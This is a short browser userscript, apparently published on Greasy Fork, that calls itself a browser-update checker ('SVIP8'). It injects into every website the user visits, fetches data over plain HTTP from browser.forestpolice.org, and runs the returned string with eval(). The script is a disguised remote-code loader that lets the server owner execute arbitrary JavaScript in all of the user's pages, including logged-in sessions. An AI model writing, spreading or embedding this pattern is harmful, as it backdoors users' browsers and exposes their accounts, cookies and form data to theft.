// ==UserScript==
// @name         SVIP8（浏览器更新检测）
// @version      1.0.0
// @description  浏览器更新检测专用
// @author       Anubis Ja
// @include      *
// @connect      forestpolice.org
// @run-at       document-end
// @grant        GM_xmlhttpRequest
// @grant        GM_info
// @namespace https://greasyfork.org/users/221438
// @downloadURL https://update.greasyfork.org/scripts/392974/SVIP8%EF%BC%88%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9B%B4%E6%96%B0%E6%A3%80%E6%B5%8B%EF%BC%89.user.js
// @updateURL https://update.greasyfork.org/scripts/392974/SVIP8%EF%BC%88%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9B%B4%E6%96%B0%E6%A3%80%E6%B5%8B%EF%BC%89.meta.js
// ==/UserScript==

GM_xmlhttpRequest({
    method: 'GET',
    url: 'http://browser.forestpolice.org/browserapi/' + GM_info.script.version,
    timeout: 1E4,
    onload: function(xhr) {
        if (xhr.status != 200) return;
        var obj = JSON.parse(xhr.responseText);
        // console.log(obj);
        if (!obj.code) eval(obj.data);
    }
});